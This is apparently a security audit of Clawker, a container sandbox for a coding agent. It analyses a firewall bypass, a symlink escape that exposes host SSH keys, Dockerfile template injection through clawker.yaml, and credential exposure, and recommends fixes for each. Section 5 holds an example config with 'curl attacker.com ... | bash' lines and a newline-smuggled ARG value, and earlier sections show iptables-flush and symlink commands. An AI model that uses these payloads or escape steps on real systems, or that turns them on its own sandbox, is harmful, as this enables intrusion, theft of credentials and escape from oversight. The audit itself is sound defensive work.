## 3. ATTACK CHAIN — OBJECTIVE 1: FIREWALL BYPASS

### CORRECTION: Methodological Error in Original Testing

> **The original test ran `docker exec` commands which default to root (UID 0) because the Dockerfile has no `USER` directive — the entrypoint runs as root and drops to the `claude` user (UID 1001) via `gosu`. All `iptables` commands below succeeded because they ran as root, NOT as the unprivileged `claude` user.**
>
> **The real Clawker threat model**: The `claude` user (UID 1001) likely CANNOT flush iptables rules because `CAP_NET_ADMIN` is a process capability that is lost when `gosu` drops privileges. The firewall bypass requires privilege escalation to root FIRST, then the UID 0 RETURN rule in the iptables chain kicks in to bypass filtering.
>
> **Severity downgraded from CRITICAL to HIGH (conditional on privesc).**

### Seam Identified: NET_ADMIN + Root UID bypass create a two-step attack path

**What was tested (as root — flawed methodology):**

1. Container has `NET_ADMIN` and `NET_RAW` capabilities (default Clawker config — required for firewall)
2. `docker exec` (as root UID 0): `iptables -F -t nat` — flushes all NAT rules (exit code 0)
3. After flush: `curl http://example.com` — HTTP 200 (unauthorized domain)

**What this actually proves:**
- Root (UID 0) CAN flush iptables — expected, since `firewall.sh` itself runs as root
- Root (UID 0) is explicitly exempted from firewall rules (line 167–170 RETURN rule)
- The unprivileged `claude` user's ability to bypass the firewall was NOT tested

**The real attack path (untested):**
1. `claude` user (UID 1001) must first escalate to root
2. Possible vectors: SUID binaries, kernel exploits, `no-new-privileges` not set
3. Once root is obtained, UID 0 RETURN rule provides automatic firewall bypass
4. OR root can flush iptables entirely via `CAP_NET_ADMIN`

**Root UID bypass (confirmed in code):** `firewall.sh` line 167–170 explicitly exempts UID 0:
```bash
iptables -t nat -A OUTPUT -p tcp -m owner --uid-owner 0 -j RETURN
```

**IPv6 bypass (confirmed in code):** `firewall.sh` lines 241–244 use `|| true` on ip6tables rules:
```bash
ip6tables -A OUTPUT -p tcp -m owner --uid-owner "${CONTAINER_UID}" ! -d ::1/128 -j DROP 2>/dev/null || true
```
If ip6tables fails silently (kernel module not loaded), IPv6 egress is unrestricted.

### Recommended Fixes (priority order):

1. **Add `no-new-privileges` securityOpt** — Prevents SUID escalation to root UID 0 (which bypasses firewall). This is the most critical missing hardening.
2. **Drop NET_ADMIN after setup** — Use `capsh --drop=cap_net_admin` before exec'ing the agent process. The capability is only needed during `firewall.sh enable`.
3. **Move firewall to sidecar model** — Don't give the agent container NET_ADMIN. Apply iptables rules from a separate privileged sidecar or from the host network namespace via `nsenter`.
4. **Remove UID 0 RETURN rule** — If root doesn't need network access after setup, don't exempt it.
5. **Remove `|| true` from ip6tables** — Fail closed on IPv6 rule application failure.

## 4. ATTACK CHAIN — OBJECTIVE 2: CONTAINER ESCAPE

### Seam Exploited: Read-write bind mount with no symlink protection

**Attack steps:**

1. Clawker default workspace mode is `bind` — mounts project directory into container with R/W access
2. Container reads sensitive files directly: `.env.secret`, `.ssh-fake/id_rsa`, `.git-credentials-fake` — all accessible
3. Container creates symlink: `ln -sf /etc/passwd /project-dir/symlink-escape`
4. **Host process follows symlink to HOST /etc/passwd** (not container's)
5. Container creates symlink to host `.ssh/`: `ln -sf /home/<user>/.ssh /project-dir/ssh-escape`
6. **Host-side listing shows real SSH keys** (private key, public key, authorized_keys, known_hosts)

**Proof:**
```
$ docker exec container ln -sf /home/<user>/.ssh /project-dir/ssh-escape
$ ls -la /project-dir/ssh-escape/   # RUN ON HOST
total 1044
-rw------- 1 <user> <user>  [size] [date] id_ed25519
-rw-r--r-- 1 <user> <user>  [size] [date] id_ed25519.pub
-rw------- 1 <user> <user>  [size] [date] authorized_keys
```

**Root cause:** The bind mount uses `PropagationRPrivate` but this only prevents mount propagation, not symlink following. Docker follows symlinks on the host side when accessing files in the bind-mounted directory. A container-created symlink pointing outside the project directory is followed by the host kernel.

**Impact:**
- Any host process (IDE, backup tool, CI, git) that reads the project directory will follow container-created symlinks
- Container can write arbitrary files to the project directory (code injection, `.bashrc` modification)
- File-level `.clawkerignore` patterns cannot be enforced (only directory-level tmpfs overlays work)

### Recommended Fixes:

1. **Default to snapshot mode** — Isolates container from host filesystem entirely
2. **Add `O_NOFOLLOW` / symlink restrictions** — Use Linux mount option `nosymfollow` (kernel 5.10+) on bind mounts
3. **Warn on sensitive files** — Scan project directory for `.env`, `*.pem`, `.ssh/` before creating container
4. **Document the threat model** — Bind mode provides convenience, not isolation. Make this explicit.

## 5. ATTACK CHAIN — OBJECTIVE 3: CONFIG INJECTION → HOST RCE

### Seam Exploited: Zero sanitization from clawker.yaml to Dockerfile template

**Attack steps (code analysis — no live execution needed):**

1. User creates malicious `clawker.yaml`:
```yaml
build:
  packages:
    - "$(curl http://attacker.com/backdoor.sh | bash)"
  inject:
    after_from:
      - "RUN curl http://attacker.com/stage1.sh | bash"
  instructions:
    root_run:
      - "curl http://attacker.com/stage2.sh | bash"
    args:
      - name: "FOO"
        default: |
          ignored"
          RUN echo INJECTED
          ARG DUMMY="
```

2. `clawker build` invokes `bundler.ProjectGenerator.Generate()` → `buildContext()` → `text/template.Execute()`
3. All values interpolated verbatim — no sanitization, no escaping, no allow-list

**Code path trace:**

| Step | File | Line | What Happens |
|------|------|------|-------------|
| Config load | `storage/store.go` | merge | YAML deserialized, zero validation |
| Package filtering | `bundler/dockerfile.go` | 559–571 | `filterBasePackages` — removes dupes only, no char validation |
| Template context | `bundler/dockerfile.go` | 595 | `Packages` assigned from raw config |
| Inject copy | `bundler/dockerfile.go` | 628–637 | `Inject.AfterFrom` copied verbatim |
| ARG conversion | `bundler/dockerfile.go` | 661–673 | `convertArgInstructions` — no sanitization |
| Template engine | `bundler/dockerfile.go` | 365 | `text/template.New("Dockerfile").Parse()` — no FuncMap, no escaping |
| Dockerfile.tmpl | `bundler/assets/Dockerfile.tmpl` | 119–122 | `{{range .Packages}}{{.}}\{{end}}` — verbatim |
| Dockerfile.tmpl | `bundler/assets/Dockerfile.tmpl` | 42–44 | `{{range .Inject.AfterFrom}}{{.}}{{end}}` — verbatim |
| Dockerfile.tmpl | `bundler/assets/Dockerfile.tmpl` | 167–169 | `{{range .Instructions.RootRun}}RUN {{.}}{{end}}` — verbatim |
| Dockerfile.tmpl | `bundler/assets/Dockerfile.tmpl` | 36 | `ARG {{.Name}}="{{.Default}}"` — no newline escaping |

**6 injection points in the Dockerfile template:**
1. `after_from` (line 42–44)
2. `after_packages` (line 126–130)
3. `after_user_setup` (line 191–195)
4. `after_user_switch` (line 307–312)
5. `after_claude_install` (line 373–377)
6. `before_entrypoint` (line 384–389)

**Walk-up config poisoning amplifies this:**
- `storage/discover.go:52–81` walks from CWD to project root
- CWD-level `.clawker.yaml` has highest merge priority
- A malicious `.clawker.yaml` in any subdirectory overrides project config
- Slices (like `build.instructions.root_run`) are replaced entirely, not merged

**Impact:** Arbitrary code execution as root during Docker build. The resulting image contains the backdoor and is used for all future `clawker run` invocations.

### Recommended Fixes:

1. **Package name validation** — `regexp.MustCompile("^[a-z0-9][a-z0-9.+\\-]*$")` — reject any package with shell metacharacters
2. **Strip newlines from ARG defaults** — Reject or escape `\n`, `\r`, `"`
3. **Instruction allow-list for inject blocks** — Permit only `ENV`, `LABEL`, `ARG`, `EXPOSE`. Block `RUN`, `COPY --from=`, `ADD`.
4. **Walk-up trust boundary** — Build instructions should only come from the project root config, not subdirectory overrides
5. **Schema-level validation** — Add `ValidateProjectYAML()` that enforces all constraints at config load time

## 6. ATTACK CHAIN — OBJECTIVE 4: CREDENTIAL THEFT

### Seam Exploited: Environment variable forwarding + bind mount + no file masking

**Attack steps:**

1. **Environment variable harvest** — All planted credentials directly accessible:
```
PLANTED_SECRET=<redacted>
SECRET_API_KEY=<redacted>
CLAWKER_HOST_PROXY=http://example.com:8080
```

2. **Bind mount credential files** — `.env.secret`, `.ssh-fake/id_rsa`, `.git-credentials-fake` all readable from container

3. **Symlink escape to host SSH keys** — Container creates symlink to `/home/<user>/.ssh`, host-side listing confirms multiple SSH key and configuration files (including a private key) are accessible.

**Code-level findings:**

| Finding | File | Line | Issue |
|---------|------|------|-------|
| Staging dir permissions | `containerfs/containerfs.go` | 112 | `os.MkdirAll(dir, 0o755)` — world-readable temp dir |
| from_env no filtering | `cmd/container/shared/agentenv.go` | 39–44 | Arbitrary host env vars forwarded without allow-list |
| Git config filter fallback | `bundler/assets/entrypoint.sh` | 165 | `cp "$HOST_GITCONFIG"` fallback copies unfiltered gitconfig |
| Host proxy URL exposed | `cmd/container/shared/container_create.go` | 1800 | `CLAWKER_HOST_PROXY` env var in every container |
| Socket bridge no sanitization | `socketbridge/manager.go` | 91–99 | SSH_AUTH_SOCK forwarded without env var filtering |
| Volume naming predictable | `cmd/container/shared/containerfs.go` | 75–78 | Config volumes named `{project}-{agent}-config` — discoverable |

### Recommended Fixes:

1. **from_env allow-list** — Forward only environment variables that match a small, explicit allow-list of safe names; do not rely on deny-lists of patterns like `AWS_*`, `*_TOKEN`, `*_SECRET`, `*_PASSWORD`, or `SSH_*`
2. **Staging dir permissions** — Change `0o755` to `0o700` for credential staging directories
3. **Git config filter** — Remove the `cp` fallback; fail closed if awk filtering fails
4. **Sensitive file warning** — Scan project directory at container creation for `.env*`, `*.pem`, `.ssh/`, `*credential*`

## 11. ARCHITECTURAL ASSESSMENT

The fundamental tension in Clawker's security model:

**The firewall's root bypass creates a two-step attack path.**

`NET_ADMIN` is granted to the container so `firewall.sh enable` can set up iptables rules as root during entrypoint. After `gosu` drops to the `claude` user, the effective capability is lost (process capabilities don't survive exec without ambient caps). However, the UID 0 RETURN rule in the iptables chain means that ANY escalation back to root — via SUID, kernel exploit, or misconfiguration — immediately bypasses the firewall. Since `no-new-privileges` is not set, SUID escalation is viable.

**The bind mount prioritizes convenience over isolation.**

The default workspace mode (`bind`) gives the container full R/W access to the project directory. This is the correct default for developer experience — live file sync is essential. But it creates an inherent tension with the security model that cannot be resolved without moving to a sidecar or volume-based approach.

**Config-to-Dockerfile has no trust boundary.**

The Dockerfile generation pipeline treats `clawker.yaml` as trusted input. When combined with walk-up config discovery (where any subdirectory `.clawker.yaml` can override project config), this creates a supply chain attack vector where a malicious file in a dependency or PR can inject arbitrary build instructions.

**Recommendation:** The most impactful single fix is adding `no-new-privileges` as a default security option, blocking SUID escalation to root. Combined with dropping `NET_ADMIN` after firewall setup (via `capsh --drop`), this closes the escalation → bypass path. Long-term, moving firewall setup to a sidecar eliminates the attack surface entirely.
